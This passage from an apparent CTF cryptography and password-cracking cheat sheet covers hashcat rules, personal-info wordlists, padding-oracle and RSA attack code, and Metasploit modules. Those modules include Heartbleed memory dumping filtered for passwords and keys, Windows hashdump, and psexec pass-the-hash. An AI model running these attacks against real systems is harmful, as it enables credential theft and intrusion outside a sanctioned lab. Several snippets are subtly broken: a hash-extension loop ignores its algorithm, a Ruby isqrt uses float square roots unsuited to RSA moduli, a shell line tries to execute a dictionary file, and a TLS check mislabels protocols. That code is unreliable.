# Best64 (balanced speed/coverage)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Dive (aggressive)
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/dive.rule

# Leetspeak
hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/leetspeak.rule
```

#### Custom Rule Syntax

**Basic Operations:**

```
: - Do nothing (test)
l - Lowercase all
u - Uppercase all
c - Capitalize first letter
C - Lowercase first, uppercase rest
t - Toggle case of all characters
r - Reverse word
d - Duplicate word
```

**Append/Prepend:**

```
$X - Append character X
^X - Prepend character X
$1$2$3 - Append "123"
^!^@ - Prepend "@!"
```

**Examples:**

bash

```bash
# Create custom rule file
echo '$1' > myrules.rule
echo '$2' >> myrules.rule
echo '$3' >> myrules.rule
echo '$!' >> myrules.rule
echo 'c' >> myrules.rule

# Apply custom rules
hashcat -a 0 -m 0 hash.txt wordlist.txt -r myrules.rule
```

**CTF-Specific Rules:**

```
# flag{word}
^{ $} ^g ^a ^l ^f
# WORD123
u $1 $2 $3
# word2023
$2 $0 $2 $3
# W0rd (leetspeak)
c so0 sa4 se3
```

#### Multi-Rule Application

bash

```bash
# Chain multiple rule files
hashcat -a 0 -m 0 hash.txt wordlist.txt -r best64.rule -r toggles1.rule

# Generate ruleset output without cracking
hashcat --stdout wordlist.txt -r best64.rule > mutated_wordlist.txt
```

### Context-Based Word Generation

#### CUPP - Common User Password Profiler

bash

```bash
# Interactive mode
cupp -i

# Generates wordlist based on:
# - Target name, surname, nickname
# - Birthdate, partner info
# - Pet names, company names
# - Keywords from OSINT

# Configuration file mode
cupp -w custom_profile.cfg -l

# Download default wordlists
cupp -d
```

#### Mentalist

bash

```bash
# GUI-based tool (if available)
mentalist

# Features:
# - Base words with attribute chains
# - Case mutations
# - Substitutions (l33t speak)
# - Append/prepend patterns
# - Date ranges
```

#### Manual Context-Based Generation

**Combine Context Words:**

bash

```bash
# Input: company.txt (target info)
# Output: combined wordlist

# Simple concatenation
while read word1; do
  while read word2; do
    echo "${word1}${word2}"
  done < years.txt
done < company.txt > combined.txt

# With separator variations
for word in $(cat base.txt); do
  for num in {0..99}; do
    echo "${word}${num}"
    echo "${word}_${num}"
    echo "${word}-${num}"
  done
done > variations.txt
```

**Date-Based Generation:**

bash

```bash
# Years 2015-2025
crunch 4 4 -t 20%% -s 2015 -e 2025 -o years.txt

# Dates in DDMMYYYY format
crunch 8 8 0123456789 -t %%0%202% -o dates.txt

# Common password patterns with years
for year in {2015..2025}; do
  echo "Password${year}"
  echo "password${year}"
  echo "Pass@${year}"
done > year_passwords.txt
```

#### Username-to-Password Mutations

bash

```bash
# Extract usernames from various sources
cat users.txt | while read user; do
  echo "$user"
  echo "${user}123"
  echo "${user}2023"
  echo "${user}!"
  echo "${user}@123"
  echo "$(echo $user | tr '[:lower:]' '[:upper:]')"
done > user_passwords.txt
```

### Wordlist Manipulation & Filtering

#### Remove Duplicates

bash

```bash
# Sort and deduplicate
sort -u wordlist.txt -o wordlist_unique.txt

# Using awk (faster for large files)
awk '!seen[$0]++' wordlist.txt > unique.txt
```

#### Length Filtering

bash

```bash
# Keep only 8-12 character passwords
awk 'length($0) >= 8 && length($0) <= 12' wordlist.txt > filtered.txt

# Remove passwords shorter than 6
awk 'length($0) >= 6' wordlist.txt > min6.txt
```

#### Pattern Matching

bash

```bash
# Only alphanumeric
grep -E '^[a-zA-Z0-9]+$' wordlist.txt > alphanum.txt

# Must contain at least one number
grep '[0-9]' wordlist.txt > with_numbers.txt

# Must contain special character
grep -E '[^a-zA-Z0-9]' wordlist.txt > with_special.txt

# Starts with capital letter
grep '^[A-Z]' wordlist.txt > capital_start.txt
```

#### Combine Multiple Wordlists

bash

```bash
# Merge and deduplicate
cat list1.txt list2.txt list3.txt | sort -u > combined.txt

# Prioritize specific lists
cat priority.txt rockyou.txt | awk '!seen[$0]++' > merged.txt
```

### Memory-Efficient Techniques

#### Piping to Crackers

bash

```bash
# Direct piping (no file creation)
crunch 6 8 abc123 | john --stdin hash.txt

# John the Ripper with rules via stdin
crunch 4 6 abcdefghijklmnopqrstuvwxyz | john --stdin --rules hash.txt

# Hashcat from stdin (hybrid mode)
crunch 4 4 abc123 | hashcat -a 0 -m 0 hash.txt
```

#### Incremental Generation

bash

```bash
# Generate on-the-fly with john
john --incremental=alpha hash.txt

# Custom charset for john
# Edit /etc/john/john.conf
[Incremental:CTF]
File = $JOHN/alpha.chr
MinLen = 4
MaxLen = 8
CharCount = 26
```

### CTF-Specific Scenarios

#### Flag Format Wordlists

bash

```bash
# Common CTF flag patterns
echo "CTF{" > prefixes.txt
echo "flag{" >> prefixes.txt
echo "FLAG{" >> prefixes.txt

# Generate with crunch
crunch 8 15 -t CTF{@@@@@} -o ctf_flags.txt

# Base64 encoded flags
cat potential_flags.txt | base64 > b64_flags.txt
```

#### Crypto Challenge Wordlists

bash

```bash
# Common crypto terms
cat > crypto_words.txt << EOF
aes
rsa
des
md5
sha
cipher
key
encrypt
decrypt
block
stream
EOF

# Generate variations
hashcat --stdout crypto_words.txt -r best64.rule > crypto_variations.txt
```

#### Steganography Passwords

bash

```bash
# Short, meaningful words
/usr/share/dict/words | awk 'length($0) <= 8' > short_words.txt

# Common stego passwords from CTF experience
cat > stego_common.txt << EOF
password
secret
hidden
admin
root
EOF
```

**Important Note:** [Inference] The effectiveness of wordlist generation depends heavily on challenge context. Password complexity requirements, rate limiting, and hash algorithms significantly impact success rates. Always analyze the target environment before generating large wordlists.

---

## Scripting & Automation

### Python Crypto Libraries (pycryptodome, cryptography)

#### PyCryptodome Library

**Installation and Setup**

```bash
pip3 install pycryptodome
# or for Debian/Kali
apt install python3-pycryptodome
```

**Core Modules Structure**

- `Crypto.Cipher` - Symmetric/asymmetric encryption
- `Crypto.Hash` - Hashing algorithms
- `Crypto.PublicKey` - RSA, DSA, ECC key operations
- `Crypto.Util` - Padding, number theory utilities
- `Crypto.Random` - Cryptographic random generation

**AES Operations**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

# Encryption
key = get_random_bytes(16)  # AES-128
cipher = AES.new(key, AES.MODE_CBC)
ct = cipher.encrypt(pad(b'plaintext', AES.block_size))
iv = cipher.iv

# Decryption
decipher = AES.new(key, AES.MODE_CBC, iv=iv)
pt = unpad(decipher.decrypt(ct), AES.block_size)
```

**ECB Mode Exploitation Pattern**

```python
from Crypto.Cipher import AES

def ecb_oracle(plaintext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, 16))

# Block duplication detection
def detect_ecb(ciphertext, block_size=16):
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    return len(blocks) != len(set(blocks))

# Byte-at-a-time ECB decryption
def ecb_decrypt_byte(oracle, known, block_size=16):
    for i in range(256):
        test = b'A' * (block_size - len(known) - 1) + known + bytes([i])
        if oracle(test)[:block_size] == oracle(b'A' * (block_size - len(known) - 1))[:block_size]:
            return bytes([i])
```

**RSA Key Operations**

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import binascii

# Key generation
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()

# Encryption/Decryption
public_key_obj = RSA.import_key(public_key)
cipher = PKCS1_OAEP.new(public_key_obj)
ciphertext = cipher.encrypt(b'message')

private_key_obj = RSA.import_key(private_key)
decipher = PKCS1_OAEP.new(private_key_obj)
plaintext = decipher.decrypt(ciphertext)

# Raw RSA operations (no padding)
n = public_key_obj.n
e = public_key_obj.e
message_int = int.from_bytes(b'test', 'big')
ciphertext_int = pow(message_int, e, n)
```

**Common Number Attack Template**

```python
from Crypto.PublicKey import RSA
from math import gcd

def common_modulus_attack(c1, c2, e1, e2, n):
    # When same message encrypted with same n, different e
    def egcd(a, b):
        if a == 0:
            return (b, 0, 1)
        gcd_val, x1, y1 = egcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return (gcd_val, x, y)
    
    _, s1, s2 = egcd(e1, e2)
    if s1 < 0:
        c1 = pow(c1, -s1, n)
        s1 = -s1
    if s2 < 0:
        c2 = pow(c2, -s2, n)
        s2 = -s2
    
    return (pow(c1, s1, n) * pow(c2, s2, n)) % n

# Usage
n = 0x... # shared modulus
c1, c2 = 0x..., 0x...
e1, e2 = 3, 5
plaintext_int = common_modulus_attack(c1, c2, e1, e2, n)
```

#### Cryptography Library

**Installation**

```bash
pip3 install cryptography
```

**High-Level Fernet Symmetric Encryption**

```python
from cryptography.fernet import Fernet

# Key generation
key = Fernet.generate_key()
cipher = Fernet(key)

# Encryption/Decryption
token = cipher.encrypt(b"secret data")
plaintext = cipher.decrypt(token)
```

**Low-Level AES-GCM**

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)
nonce = os.urandom(12)

ciphertext = aesgcm.encrypt(nonce, b"plaintext", b"associated_data")
plaintext = aesgcm.decrypt(nonce, ciphertext, b"associated_data")
```

**X.509 Certificate Parsing**

```python
from cryptography import x509
from cryptography.hazmat.backends import default_backend

with open("cert.pem", "rb") as f:
    cert_data = f.read()
    cert = x509.load_pem_x509_certificate(cert_data, default_backend())

print(f"Subject: {cert.subject}")
print(f"Issuer: {cert.issuer}")
print(f"Serial: {cert.serial_number}")
print(f"Not valid before: {cert.not_valid_before_utc}")
print(f"Not valid after: {cert.not_valid_after_utc}")
```

**RSA Signature Verification**

```python
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding

# Load public key
with open("public_key.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

# Verify signature
try:
    public_key.verify(
        signature,
        message,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    print("Signature valid")
except:
    print("Signature invalid")
```

**HMAC Operations**

```python
from cryptography.hazmat.primitives import hashes, hmac

h = hmac.HMAC(key, hashes.SHA256())
h.update(b"message")
signature = h.finalize()

# Verification
h2 = hmac.HMAC(key, hashes.SHA256())
h2.update(b"message")
h2.verify(signature)  # Raises exception if invalid
```

### Automated Attack Chains

#### Generic CTF Crypto Attack Framework

**Modular Attack Structure**

```python
import hashlib
import itertools
from Crypto.Util.number import long_to_bytes, bytes_to_long

class CryptoAttack:
    def __init__(self, ciphertext=None, public_key=None):
        self.ciphertext = ciphertext
        self.public_key = public_key
        self.results = []
    
    def register_attack(self, name, func):
        self.results.append({
            'name': name,
            'function': func
        })
    
    def execute_all(self):
        for attack in self.results:
            try:
                result = attack['function']()
                if result:
                    print(f"[+] {attack['name']}: SUCCESS")
                    print(f"    Result: {result}")
                    return result
            except Exception as e:
                print(f"[-] {attack['name']}: FAILED ({str(e)})")
        return None

# Usage example
def weak_rsa_attack(n, e, c):
    attack = CryptoAttack(ciphertext=c)
    
    # Register multiple attacks
    attack.register_attack("Small e", lambda: small_e_attack(n, e, c))
    attack.register_attack("Fermat", lambda: fermat_factorization(n, e, c))
    attack.register_attack("Wiener", lambda: wiener_attack(n, e, c))
    
    return attack.execute_all()
```

**Hash Length Extension Attack Automation**

```python
import hashpumpy

def hash_extension_attack(original_data, original_hash, append_data, key_length):
    """
    Automate hash length extension attacks
    """
    # Supports MD5, SHA1, SHA256, SHA512
    algorithms = ['md5', 'sha1', 'sha256', 'sha512']
    
    for algo in algorithms:
        try:
            new_hash, new_data = hashpumpy.hashpump(
                original_hash,
                original_data,
                append_data,
                key_length
            )
            print(f"[+] {algo.upper()} extension:")
            print(f"    New hash: {new_hash}")
            print(f"    New data: {new_data.hex()}")
        except Exception as e:
            print(f"[-] {algo.upper()}: {e}")
```

**XOR Analysis Chain**

```python
def automated_xor_analysis(ciphertext):
    """
    Run multiple XOR-based attacks
    """
    results = {}
    
    # Single-byte XOR bruteforce
    def single_byte_xor():
        candidates = []
        for key in range(256):
            plaintext = bytes([b ^ key for b in ciphertext])
            score = sum([c in b'etaoinshrdlu ETAOINSHRDLU' for c in plaintext])
            candidates.append((score, key, plaintext))
        return max(candidates)[2]
    
    # Repeating-key XOR with known plaintext
    def extract_key(known_plaintext, position=0):
        key = bytes([c ^ p for c, p in zip(ciphertext[position:], known_plaintext)])
        return key
    
    # Detect key length via Hamming distance
    def detect_keysize(max_keysize=40):
        distances = []
        for keysize in range(2, max_keysize + 1):
            blocks = [ciphertext[i:i+keysize] for i in range(0, len(ciphertext), keysize)][:4]
            if len(blocks) < 2:
                continue
            dist = sum([hamming_distance(blocks[i], blocks[i+1]) for i in range(len(blocks)-1)])
            normalized = dist / (keysize * (len(blocks) - 1))
            distances.append((normalized, keysize))
        return sorted(distances)[:3]
    
    results['single_byte'] = single_byte_xor()
    results['likely_keysizes'] = detect_keysize()
    
    return results

def hamming_distance(b1, b2):
    return sum(bin(x ^ y).count('1') for x, y in zip(b1, b2))
```

#### Network Protocol Attack Automation

**TLS Downgrade Detection Script**

```python
import socket
import ssl

def test_tls_versions(host, port=443):
    protocols = {
        'SSLv3': ssl.PROTOCOL_SSLv23,  # Note: Deprecated
        'TLSv1.0': ssl.PROTOCOL_TLSv1,
        'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
        'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
        'TLSv1.3': ssl.PROTOCOL_TLS
    }
    
    results = {}
    for name, protocol in protocols.items():
        try:
            context = ssl.SSLContext(protocol)
            with socket.create_connection((host, port)) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    results[name] = {
                        'supported': True,
                        'cipher': ssock.cipher(),
                        'version': ssock.version()
                    }
        except Exception as e:
            results[name] = {'supported': False, 'error': str(e)}
    
    return results
```

**Padding Oracle Attack Automation**

```python
def padding_oracle_attack(oracle_function, ciphertext, block_size=16, iv=None):
    """
    oracle_function: Takes ciphertext, returns True if padding valid
    """
    blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
    if iv:
        blocks.insert(0, iv)
    
    plaintext = b''
    
    for block_num in range(len(blocks) - 1, 0, -1):
        current_block = bytearray(blocks[block_num])
        previous_block = bytearray(blocks[block_num - 1])
        decrypted_block = bytearray(block_size)
        
        for pad_value in range(1, block_size + 1):
            for byte_val in range(256):
                previous_block[-pad_value] = byte_val
                
                # Adjust already known bytes
                for known in range(1, pad_value):
                    previous_block[-known] = decrypted_block[-known] ^ pad_value
                
                test_ct = bytes(previous_block) + bytes(current_block)
                
                if oracle_function(test_ct):
                    decrypted_block[-pad_value] = byte_val ^ pad_value ^ blocks[block_num - 1][-pad_value]
                    break
        
        plaintext = bytes(decrypted_block) + plaintext
    
    return plaintext
```

### Exploit Framework (Metasploit)

#### Metasploit Crypto-Related Modules

**SSL/TLS Vulnerability Scanning**

```bash
# Heartbleed detection and exploitation
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; \
set RHOSTS target.com; set RPORT 443; set VERBOSE true; run; exit"

# SSL version detection
use auxiliary/scanner/ssl/ssl_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# Weak cipher detection
use auxiliary/scanner/ssl/ssl_cipher
set RHOSTS target.com
set RPORT 443
run
```

**Certificate Manipulation**

```bash
# SSL certificate impersonation
use auxiliary/gather/impersonate_ssl
set RHOST target.com
set RPORT 443
run

# Extract certificate information
use auxiliary/scanner/ssl/cert_validator
set RHOSTS target.com
run
```

**Password Hash Extraction and Cracking Integration**

```bash
# Post-exploitation hash dump
use post/windows/gather/hashdump
set SESSION 1
run

# Automatic John the Ripper integration
use auxiliary/analyze/jtr_crack_fast
set JOHN_BASE /usr/share/john
run

# Pass-the-hash authentication
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.50
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
exploit
```

#### Custom Metasploit Crypto Modules

**Basic Module Structure for Crypto Exploits**

```ruby
# ~/.msf4/modules/auxiliary/crypto/custom_attack.rb
require 'msf/core'
require 'openssl'

class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Custom Crypto Attack',
      'Description' => 'Exploits weak cryptographic implementation',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))

    register_options([
      OptString.new('RHOST', [true, 'Target host']),
      OptInt.new('RPORT', [true, 'Target port', 443]),
      OptString.new('CIPHERTEXT', [true, 'Base64 encoded ciphertext'])
    ])
  end

  def run
    ciphertext = Rex::Text.decode_base64(datastore['CIPHERTEXT'])
    
    print_status("Attempting decryption...")
    result = perform_attack(ciphertext)
    
    if result
      print_good("Plaintext recovered: #{result}")
    else
      print_error("Attack failed")
    end
  end

  def perform_attack(data)
    # [Inference] Attack logic implementation
    # Actual attack code would go here
  end
end
```

**RSA Module Example Structure**

```ruby
require 'openssl'

def weak_rsa_check(n, e)
  # Small exponent attack
  if e < 65537
    print_warning("Weak exponent detected: #{e}")
    return true
  end
  
  # Fermat factorization for close primes
  a = isqrt(n) + 1
  b_squared = a**2 - n
  
  100000.times do
    if is_perfect_square(b_squared)
      b = isqrt(b_squared)
      p = a - b
      q = a + b
      
      if p * q == n
        print_good("Factors found: p=#{p}, q=#{q}")
        return [p, q]
      end
    end
    a += 1
    b_squared = a**2 - n
  end
  
  false
end

def isqrt(n)
  Math.sqrt(n).to_i
end

def is_perfect_square(n)
  root = isqrt(n)
  root * root == n
end
```

#### Metasploit Resource Scripts for Crypto CTF

**Automated SSL Enumeration**

```bash
# ssl_recon.rc
use auxiliary/scanner/ssl/ssl_version
set RHOSTS file:/tmp/targets.txt
set THREADS 20
run

use auxiliary/scanner/ssl/ssl_cipher
set RHOSTS file:/tmp/targets.txt
set THREADS 20
run

use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS file:/tmp/targets.txt
set VERBOSE false
run

# Execute with: msfconsole -r ssl_recon.rc
```

**Hash Cracking Pipeline**

```bash
# hash_pipeline.rc
workspace -a crypto_ctf

use auxiliary/analyze/crack_databases
set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
set ITERATION_TIMEOUT 600
run

use post/multi/gather/creds_dump
set SESSION -1
run

db_export -f pwdump /tmp/cracked_hashes.txt
```

#### Metasploit Database for Crypto Intelligence

**Storing and Querying Crypto Artifacts**

```bash
# Initialize database
msfdb init
msfconsole

# Store discovered keys
db_nmap -sV --script ssl-cert target.com
hosts
services -p 443 -S ssl

# Query stored certificates
db_export -f xml /tmp/ssl_certs.xml

# Store custom crypto data
creds add user:admin password:hash$5$abc... realm:ctf.example.com
```

**[Inference] Integration with External Tools**

```python
#!/usr/bin/env python3
# msf_crypto_integration.py

import subprocess
import json

def msf_ssl_scan(target):
    """
    [Inference] This pattern shows integration approach,
    actual results depend on target configuration
    """
    cmd = [
        'msfconsole', '-q', '-x',
        f'use auxiliary/scanner/ssl/ssl_version; '
        f'set RHOSTS {target}; '
        f'run; exit'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout

def parse_msf_output(output):
    """
    Parse Metasploit output for crypto analysis
    """
    vulnerabilities = []
    if 'SSLv3' in output:
        vulnerabilities.append('POODLE_vulnerable')
    if 'TLSv1.0' in output:
        vulnerabilities.append('BEAST_possible')
    
    return vulnerabilities
```

**Key Metasploit Crypto Commands**

```bash
# Search crypto-related modules
search type:auxiliary ssl
search type:exploit crypto
search heartbleed

# Check module options
info auxiliary/scanner/ssl/openssl_heartbleed
show options

# Advanced module usage
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.0/24
set THREADS 50
set VERBOSE false
set DUMPFILTER (pass|key|secret)
run

# Save output
spool /tmp/heartbleed_output.txt
run
spool off
```

**Disclaimers:** [Inference] Attack success rates and module effectiveness depend on target configuration, network conditions, and specific vulnerability presence. The framework examples demonstrate structural patterns; actual exploitation requires adapting to specific CTF scenarios.

[Unverified] Metasploit module compatibility may vary across versions. Always verify module availability in your specific Metasploit Framework installation.

---

## Online Resources & Tools

### CyberChef (Cipher Identification & Decryption)

**CyberChef** is a web-based data manipulation framework developed by GCHQ. Access at `https://gchq.github.io/CyberChef/` or install locally via npm.

**Core Cryptographic Operations:**

Recipe chaining for multi-stage decoding:

```
Input → From Base64 → AES Decrypt → From Hex → XOR → Output
```

**Common CTF Recipes:**

Base encoding detection and decoding:

- `From Base64` - Standard Base64
- `From Base32` - RFC 4648 Base32
- `From Base58` - Bitcoin-style encoding
- `Magic` operation - Auto-detects encoding

XOR operations:

- `XOR` - Single byte or multi-byte key
- `XOR Brute Force` - Tests all single-byte keys (0x00-0xFF)
- Displays results sorted by likelihood based on character frequency

```
Recipe example for XOR brute force:
1. Input: encrypted hex string
2. From Hex
3. XOR Brute Force
4. Output shows all 256 possibilities ranked
```

Symmetric encryption modules:

- `AES Decrypt` - Supports ECB, CBC, CTR, GCM, CFB, OFB modes
    - Key formats: Hex, UTF8, Latin1, Base64
    - IV/Nonce configuration
    - PKCS#7 padding options
- `DES Decrypt` / `Triple DES Decrypt`
- `Blowfish Decrypt`
- `RC4` - Stream cipher operations

Hashing and verification:

- `MD5`, `SHA1`, `SHA2 (256/512)`, `SHA3`
- `HMAC` - Keyed hash functions
- `Bcrypt compare` - Password hash verification
- `Compare hashes` - Side-by-side comparison

**Advanced CTF Techniques:**

Magic operation workflow:

```
1. Paste unknown ciphertext
2. Add "Magic" operation (depth: 3-5)
3. Set intensive mode for thorough analysis
4. Reviews Base64, Hex, URL encoding, compression
```

[Inference] The Magic operation uses entropy analysis and pattern matching to suggest likely encodings, but results require manual verification.

Bitwise operations for custom schemes:

- `Rotate left/right` - ROT operations
- `Swap endianness` - Byte order manipulation
- `To Binary` → `AND/OR/XOR/NOT` → `From Binary`

Subsections for data extraction:

- `Strings` - Extract printable characters
- `Regular expression` - Pattern matching
- `Find/Replace` - Text manipulation
- `Split` / `Merge` - Data chunking

**Practical CTF Example:**

Multi-layer encoding challenge:

```
Input: VjFaS1IxWXhiRmRYYmxKV1lsZHplRll3Wkc5aU...

Recipe:
1. From Base64
2. From Base64 (again - double encoded)
3. ROT13
4. From Hex
5. Output: flag{...}
```

**Local Installation:**

```bash
git clone https://github.com/gchq/CyberChef.git
cd CyberChef
npm install
npm run build
# Access via file://path/to/CyberChef/build/prod/CyberChef.html
```

Benefits of local installation:

- Offline availability during CTFs
- No data transmission concerns
- Faster processing for large files
- Custom operation development possible

### Dcode.fr (Classical Ciphers)

**Dcode.fr** (`https://www.dcode.fr/en`) specializes in classical and historical cipher analysis with automated solving capabilities.

**Classical Cipher Categories:**

Substitution ciphers:

- **Caesar Cipher** - Shift cipher with brute force (26 possibilities)
- **Affine Cipher** - Linear transformation: `E(x) = (ax + b) mod 26`
- **Atbash Cipher** - A↔Z, B↔Y reversal
- **Substitution Cipher** - Arbitrary letter mapping with frequency analysis
- **Homophonic Substitution** - Multiple ciphertext characters per plaintext

Transposition ciphers:

- **Rail Fence Cipher** - Zigzag pattern writing
    - Configurable rail count (2-10+ rails)
    - Auto-detection attempts all rail counts
- **Columnar Transposition** - Grid-based reordering
    - Key-based column permutation
    - Dictionary attack on key
- **Scytale Cipher** - Ancient cylindrical transposition

Polygraphic ciphers:

- **Playfair Cipher** - 5×5 grid, digraph substitution
    - Requires 25-letter key (I/J combined)
    - Auto key discovery via hill climbing
- **Four-Square Cipher** - 4 grids, enhanced Playfair
- **Bifid Cipher** - Fractionation with Polybius square

Polyalphabetic ciphers:

- **Vigenère Cipher** - Multiple Caesar shifts with repeating key
    - Kasiski examination for key length
    - Friedman test for key length estimation
    - Frequency analysis per key position
- **Beaufort Cipher** - Variant: `E(x) = (k - x) mod 26`
- **Gronsfeld Cipher** - Numeric key Vigenère variant
- **Autokey Cipher** - Self-extending key using plaintext

**Automated Analysis Features:**

Cipher identification tool:

```
Process:
1. Input ciphertext
2. Access "Cipher Identifier" tool
3. System analyzes:
   - Character frequency
   - Index of coincidence
   - Pattern structures
   - N-gram distributions
4. Returns ranked list of probable ciphers
```

[Inference] The identifier uses statistical heuristics and may misidentify short ciphertexts or unusual variants.

Frequency analysis capabilities:

- Letter frequency distribution graphs
- Bigram/trigram analysis
- Index of Coincidence calculation (English: ~0.067)
- Chi-squared test against expected distributions

**CTF-Specific Tools:**

Book cipher decoder:

- Requires reference text
- Supports page-line-word or word number formats
- Can attempt common books (Bible, Declaration of Independence)

Bacon cipher:

- Binary substitution using A/B groups
- Multiple font/format variants supported

Morse code:

- Standard International Morse
- American Morse variant
- Auto-detection of dit/dah separators

Pigpen/Masonic cipher:

- Symbol-based substitution
- Multiple grid layouts recognized

**Practical Workflow:**

Unknown classical cipher approach:

```
1. Use Cipher Identifier
   - Input full ciphertext
   - Note top 3-5 suggestions

2. Calculate Index of Coincidence
   - IoC ≈ 0.067: Monoalphabetic substitution
   - IoC ≈ 0.045: Polyalphabetic (Vigenère likely)
   - IoC ≈ 0.067 + patterns: Transposition

3. For Vigenère detection:
   - Use Kasiski examination
   - Find repeated sequences
   - Calculate GCD of distances
   - Test suggested key lengths

4. Apply frequency analysis
   - Match against English statistics
   - Check for common words (THE, AND, OF)
```

**Hash and Modern Crypto Tools:**

Available but limited:

- MD5, SHA hash calculators
- Basic Base64/Hex conversions
- ROT13/ROT47 implementations

[Unverified] Dcode.fr's modern crypto tools are less comprehensive than specialized platforms; use for classical ciphers primarily.

### FactorDB (RSA Factorization Database)

**FactorDB** (`http://factordb.com/`) is a crowdsourced database of integer factorizations, critical for RSA challenges with weak moduli.

**Query Methods:**

Web interface search:

```
Direct URL format:
http://factordb.com/index.php?query=<number>

Example:
http://factordb.com/index.php?query=123456789012345678901234567890123456789
```

API access (programmatic):

```python
import requests

def factordb_query(n):
    url = f"http://factordb.com/api?query={n}"
    response = requests.get(url)
    data = response.json()
    return data

# Response structure:
# {
#   "id": "...",
#   "status": "FF" | "CF" | "C" | "P" | "PRP" | "U",
#   "factors": [["factor1", exponent1], ["factor2", exponent2]]
# }
```

Status codes:

- `C` - Composite, but not fully factored
- `CF` - Composite, fully factored
- `FF` - Factorization complete
- `P` - Proven prime
- `PRP` - Probably prime
- `U` - Unit (1 or -1)

**Factorization Retrieval:**

```python
import requests

def get_factors(n):
    response = requests.get(f"http://factordb.com/api?query={n}")
    data = response.json()
    
    if data['status'] in ['FF', 'CF']:
        factors = []
        for factor_data in data['factors']:
            factor = int(factor_data[0])
            exponent = int(factor_data[1])
            factors.append((factor, exponent))
        return factors
    return None

# Example RSA modulus lookup:
n = 123456789012345678901234567890123456789
factors = get_factors(n)
if factors:
    print("p =", factors[0][0])
    print("q =", factors[1][0])
```

**CTF Integration:**

Automated RSA solving with FactorDB:

```python
from Crypto.Util.number import inverse, long_to_bytes
import requests

def solve_rsa_factordb(n, e, c):
    # Query FactorDB
    response = requests.get(f"http://factordb.com/api?query={n}")
    data = response.json()
    
    if data['status'] not in ['FF', 'CF']:
        return None
    
    # Extract p and q
    factors = [int(f[0]) for f in data['factors']]
    if len(factors) != 2:
        return None
    
    p, q = factors[0], factors[1]
    
    # Calculate private key
    phi = (p - 1) * (q - 1)
    d = inverse(e, phi)
    
    # Decrypt
    m = pow(c, d, n)
    plaintext = long_to_bytes(m)
    
    return plaintext

# Usage:
n = 0x9a9b9c...  # From challenge
e = 65537
c = 0x1a2b3c...  # Ciphertext
flag = solve_rsa_factordb(n, e, c)
```

**Known Factorization Patterns:**

Common weak moduli in CTFs:

- **Small factors** - Products of primes < 10^12
- **Fermat factors** - p and q very close: `|p - q|` small
- **Known primes** - Reused primes from previous challenges
- **Special forms** - Mersenne numbers, factorial-based

Batch checking script:

```python
def check_multiple_moduli(moduli_list):
    results = {}
    for n in moduli_list:
        response = requests.get(f"http://factordb.com/api?query={n}")
        data = response.json()
        if data['status'] in ['FF', 'CF']:
            results[n] = data['factors']
    return results
```

**Limitations:**

[Unverified] FactorDB coverage:

- Contains billions of factorizations
- Not exhaustive for all composites
- Larger numbers (>300 digits) less likely to be factored
- Recent CTF moduli may not be indexed yet

**Submitting Factorizations:**

Contributing new factors helps the community:

```
Web interface:
1. Navigate to http://factordb.com/
2. Enter number in search box
3. If unfactored, submit via "Add Factors" link
4. Provide factors with proof if possible
```

### RsaCtfTool (RSA Attacks Automation)

**RsaCtfTool** is a comprehensive Python framework automating multiple RSA attack vectors. Repository: `https://github.com/RsaCtfTool/RsaCtfTool`

**Installation:**

```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool
pip3 install -r requirements.txt
# Or use pipenv:
pipenv install
pipenv shell
```

Dependencies include:

- `gmpy2` - Fast arithmetic
- `pycryptodome` - Crypto primitives
- `sympy` - Number theory
- `requests` - FactorDB integration

**Basic Usage:**

Simple decryption with public key:

```bash
python3 RsaCtfTool.py --publickey public.pem --uncipherfile ciphertext.txt

# With custom output:
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.bin --output plaintext.txt
```

Multiple attack modes enabled:

```bash
# Enable all attacks (default)
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --attack all

# Specific attack selection:
python3 RsaCtfTool.py --publickey pub.pem --uncipherfile cipher.txt --attack factordb,wiener,hastads
```

**Attack Types Implemented:**

Factorization-based attacks:

- **FactorDB** - Online database lookup
- **Fermat** - Close prime factorization
- **Pollard P-1** - Smooth p-1 factors
- **Williams P+1** - Smooth p+1 factors
- **ECM** - Elliptic curve method (via external tools)
- **Small q** - Trial division for small factors
- **Siqs** - Self-initializing quadratic sieve

Mathematical attacks:

- **Wiener** - Continued fractions for small d (d < n^0.25)
